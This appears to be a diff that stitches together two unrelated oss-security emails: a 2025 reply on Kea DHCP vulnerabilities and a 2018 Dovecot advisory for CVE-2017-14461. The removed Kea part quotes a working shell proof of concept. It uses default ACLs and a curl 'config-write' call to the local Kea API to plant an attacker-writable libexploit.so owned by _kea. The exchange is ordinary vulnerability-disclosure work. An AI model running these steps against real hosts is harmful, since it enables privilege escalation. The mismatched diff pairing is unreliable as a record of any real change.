@@ -1,4 +1,9 @@
-Received: (qmail 7812 invoked by uid 550); 30 May 2025 08:12:03 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["612" "Thursday" "1" "March" "2018" "08:51:52" "+0200" "Aki Tuomi" "aki.tuomi@open-xchange.com" "<753925945.338.1519887112610@appsuite-dev.open-xchange.com>" "14" "[oss-security] Dovecot Security Advisory: CVE-2017-14461 rfc822_parse_domain Information Leak Vulnerability" nil nil nil "3" "2018030106:51:52" "[oss-security] Dovecot Security Advisory: CVE-2017-14461 rfc822_parse_domain Information Leak Vulnerability" (number mark "U       aki.tuomi@op Mar  1   14/612   " thread-indent "\"[oss-security] Dovecot Security Advisory: CVE-2017-14461 rfc822_parse_domain Information Leak Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 24240 invoked by uid 550); 1 Mar 2018 09:42:47 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,121 +12,42 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 7794 invoked from network); 30 May 2025 08:12:03 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
-	t=1748592712; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 in-reply-to:in-reply-to:references:references;
-	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
-	b=pVULYuYolz/i+kPFbb4O6Zoku/vzNIAejMXvFEbDpfAnNG9YwOJ5MkEBfuciRD5+4Ur5sF
-	FZSOSPdfKlm+IRQqwXvuVdjTADjN+FQ350CzKJTXwRJnDW3DmWuqbvoN6deM9JswMyX96a
-	cainBkmr8P2pzxO30YEZJUoqUxyrs60=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
-	s=susede2_ed25519; t=1748592712;
-	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 in-reply-to:in-reply-to:references:references;
-	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
-	b=JmTvwlQnAjmvRNMxCUtHcWwKVQO8QmI5+N8n3sqI/kIoLbZog4TJuo7WP2U+Rs1MeVEdmd
-	PFBlrTayo3BNYSCw==
-Authentication-Results: smtp-out2.suse.de;
-	none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
-	t=1748592712; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 in-reply-to:in-reply-to:references:references;
-	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
-	b=pVULYuYolz/i+kPFbb4O6Zoku/vzNIAejMXvFEbDpfAnNG9YwOJ5MkEBfuciRD5+4Ur5sF
-	FZSOSPdfKlm+IRQqwXvuVdjTADjN+FQ350CzKJTXwRJnDW3DmWuqbvoN6deM9JswMyX96a
-	cainBkmr8P2pzxO30YEZJUoqUxyrs60=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
-	s=susede2_ed25519; t=1748592712;
-	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
-	 mime-version:mime-version:content-type:content-type:
-	 in-reply-to:in-reply-to:references:references;
-	bh=qMYh90MMAKG+SG9uh9BL8o0G931kbl0q3LtzDkrUIkk=;
-	b=JmTvwlQnAjmvRNMxCUtHcWwKVQO8QmI5+N8n3sqI/kIoLbZog4TJuo7WP2U+Rs1MeVEdmd
-	PFBlrTayo3BNYSCw==
-Date: Fri, 30 May 2025 10:11:51 +0200
-From: Matthias Gerstner <mgerstner@suse.de>
+Received: (qmail 16039 invoked from network); 1 Mar 2018 06:53:24 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=open-xchange.com;
+	s=201705; t=1519887192;
+	bh=6f3vHK/HtQMslVaOs4LG/dJweh0gp+0UI5Mqavuxk+w=;
+	h=Date:From:To:Subject:From;
+	b=1tRZGeSfUXUjJQhMO1Bj9KZ0bXBFTKMYG7Asd4+Cc55NjtVFb7NboKLup6m5RIjSN
+	 wCHx/ukluzwH5a1aDmb++BWN4RjbQ9oTgeclTtrZjIEBRZGUjnzxHBd5eHPzX8FF2v
+	 WbdrvLtIxZv+IpDYpK5pGMTyfhlQ6WT5wOEKqoPBQH489INPS4UV3HgECxa3gW/i+8
+	 sew22OlxpQGPFg5cp2Clza6xG4m/sJYZ2wYgWtSoyJMlP9sTfra2egA17O37G9iQ2m
+	 8LgOTLH7ONlFFr8uC5/4O61Z7wcyKPD/7LJPQE9QLWM0IM4dHukrcPYqUlKF3VluR9
+	 LZxNQvtfrbxFg==
+Date: Thu, 1 Mar 2018 08:51:52 +0200 (EET)
+From: Aki Tuomi <aki.tuomi@open-xchange.com>
 To: oss-security@lists.openwall.com
-Message-ID: <aDloR_R9LjYpBB28@kasco.suse.de>
-References: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
- <aDdGEfMxLaRJzSK9@kasco.suse.de>
- <20250528182325.yuupynsufybqvea3@jwilk.net>
+Message-ID: <753925945.338.1519887112610@appsuite-dev.open-xchange.com>
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
-	protocol="application/pgp-signature"; boundary="kWcRLGka4QwYZNRp"
-Content-Disposition: inline
-In-Reply-To: <20250528182325.yuupynsufybqvea3@jwilk.net>
-Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
- (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+Importance: Medium
+X-Mailer: Open-Xchange Mailer v7.10.0-Rev3
+X-Originating-Client: open-xchange-appsuite
+Subject: [oss-security] Dovecot Security Advisory: CVE-2017-14461 rfc822_parse_domain
+ Information Leak Vulnerability
 
---kWcRLGka4QwYZNRp
-Content-Type: text/plain; protected-headers=v1; charset=us-ascii
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
-Date: Fri, 30 May 2025 10:11:51 +0200
-From: Matthias Gerstner <mgerstner@suse.de>
-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
- (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)
+Vulnerable versions: 2.0 - 2.2.33, 2.3.0
+Fixed versions: 2.2.34, 2.3.0.1
+Score: 7.5, AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
 
-Hi,
+This vulnerability comes in two flavors. A malicious party can send a
+specially crafted email to a vulnerable system, causing it to crash
+dovecot. In some systems, the mail can be stored into the mail system, 
+causing crash every time it is being opened.
 
-On Wed, May 28, 2025 at 08:23:25PM +0200, Jakub Wilk wrote:
-> * Matthias Gerstner <mgerstner@suse.de>, 2025-05-28 19:21:
-> >By leveraging issue 3.2), the Kea services can be instructed to create=20
-> >`_kea` owned files in the attacker's `$HOME/.Private`. The content of=20
-> >the created files is not fully attacker controlled, however, so it will=
-=20
-> >not be possible to craft a valid ELF object for loading via `dlopen()`=20
-> >this way. By placing a setgid-directory in `$HOME/.Private/evil-dir`,=20
-> >any files created in this directory will even have the group-ownership=20
-> >of the attacker. The file mode will be 0644, however,
->=20
-> Default ACLs to the rescue!
->=20
-> $ chmod a+x ~
-> $ mkdir -m 777 ~/.Private
-> $ setfacl -d -m u:$LOGNAME:rwx ~/.Private/
-> $ curl -s -H "Content-Type: application/json" -d '{ "command": "config-wr=
-ite", "arguments": { "filename": "'"$HOME"'/.Private/libexploit.so" } }' lo=
-calhost:8000 > /dev/null
-> $ echo pwned > ~/.Private/libexploit.so
-> $ ls -l ~/.Private/libexploit.so
-> -rw-rw-rw-+ 1 _kea _kea 6 May 28 18:15 /home/jwilk/.Private/libexploit.so
-> $ cat ~/.Private/libexploit.so
-> pwned
+If the mail is stored into the mail system, it can be used to also leak
+heap memory from IMAP process by requesting bodystructure of the mail.
 
-very nice addition! We already felt like there was little left to
-succeed in the attack, but didn't think of ACLs.
-
-We will make an update to our blog post to reflect this.
-
-Cheers
-
-Matthias
-
---kWcRLGka4QwYZNRp
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmg5aEcACgkQFMQFyXGS
-NVMJ4Q/6A2SCjmKOoCVBPUC6Fik7JagfbsOp7WZKXnR1VX727YeqsVigSVm6vH0A
-VpqH36ar9Yw6q3sLymxkHNn+A/X/UMGMnA5025JnpoaIqU1r/jwz4BltYywBo0Th
-qitNIEioRh97d3hXqR2LXm+5ZOzMk+AqINtUQXDcxpzLHOmCP5SdWBeS9kivoRn6
-hWaoNanI1SAoEAud5/8Lhk98WKRr0i22XeUVFDiWV0VU31s59uvqeRycyp0pqE8h
-S3lizQuN4rfSx3rR3YMWx4V0NxGqYZX5e7MQga3Q62qEUdpo1JlOsv0frM2vEcDH
-oK+4ObKEjIX/O97vJPY/TE8kcKb1NFwTGfSc7OPM5nAdUH9hZKEeprX4tubtBSva
-WcaiMqDdpJcYrJTBMWxy27++PN7NuBXROqrco87+rssJ9bCem+fF8vJ0P6riJhwN
-X2ZvbTAC45JZ5kztiFl7VU3shI0E/I2U3oSnpUmKpP5vJHSrproDkbczJg2+zWOP
-T9GBqCiSOoLbAxz1M5H5euYs5Ezk+RrbbO3CCWuKXpXm6U9S24ZD/ZCnkEvZti5C
-EXObZq1XHk8ckMubofr0hWvJCw8wAZxOs4dnrtQsBnwYPpjZD/af80ZuB3KtBZQY
-GbjXyXaIDfglvsda27HhppbJOOxAFigaRL5GmNNBz2S8sDMfJ+A=
-=B799
------END PGP SIGNATURE-----
-
---kWcRLGka4QwYZNRp--
+This bug was separately reported by Cisco TALOS and thru HackerOne
+program by 'flxflndy'.
